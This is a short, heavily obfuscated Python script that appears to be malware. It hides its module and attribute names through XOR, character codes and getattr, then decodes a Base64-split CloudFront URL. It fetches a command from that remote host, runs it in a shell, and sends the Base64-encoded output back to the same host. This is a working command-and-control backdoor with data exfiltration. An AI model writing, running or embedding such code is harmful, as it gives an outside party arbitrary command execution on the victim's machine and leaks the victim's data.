import base64 as __A__
import subprocess as __B__
import urllib.parse as __C__
import urllib.request as __D__

# Obfuscate 'requests' via double XOR
_k = 42
__encoded_mod = [ord(c) ^ _k for c in "requests"]
__mod = ''.join([chr(x ^ _k) for x in __encoded_mod])
__E__ = __import__(__mod)
__F__ = getattr(__E__, ''.join([chr(i) for i in [103, 101, 116]]))  # 'get'

# Split Base64 string for the URL
__x = [
    'aHR0cHM6Ly9kM2ducGFz',
    'b2JjZHlpZi5jbG91ZGZy',
    'b250Lm5ldC9paXMydHN6',
    'ZHprcWIvdXBkYXRlLnR4dA=='
]
__G__ = __A__.b64decode(''.join(__x).encode()).decode()

# Get remote content
__H__ = __F__(__G__)
__I__ = ''.join([chr(x) for x in [116, 101, 120, 116]])  # 'text'
__J__ = getattr(__H__, __I__)
__K__ = getattr(__J__, 'strip')()

# Run shell command
__L__ = getattr(__B__, 'run')
__M__ = {
    ''.join([chr(i) for i in [115, 104, 101, 108, 108]]): True,
    ''.join([chr(i) for i in [99, 97, 112, 116, 117, 114, 101, 95, 111, 117, 116, 112, 117, 116]]): True,
    ''.join([chr(i) for i in [116, 101, 120, 116]]): True
}
__N__ = __L__(__K__, **__M__)

# Handle stdout/stderr
__O__ = getattr(__N__, 'stdout')
__P__ = getattr(__N__, 'stderr')
__Q__ = getattr(__O__, 'strip')() or getattr(__P__, 'strip')()

# Encode output and prepare second request
__R__ = getattr(__Q__, 'encode')()
__S__ = getattr(__A__, 'b64encode')(__R__)
__T__ = getattr(__S__, 'decode')()

__y = [
    'aHR0cHM6Ly9kM2ducGFz',
    'b2JjZHlpZi5jbG91ZGZy',
    'b250Lm5ldC9paXMydHN6',
    'ZHprcWIv'
]
__U__ = __A__.b64decode(''.join(__y).encode()).decode()

__V__ = getattr(__C__, 'quote_plus')(__T__)
__W__ = __U__ + '?' + ''.join([chr(x) for x in [100, 97, 116, 97]]) + '=' + __V__
__F__(__W__)
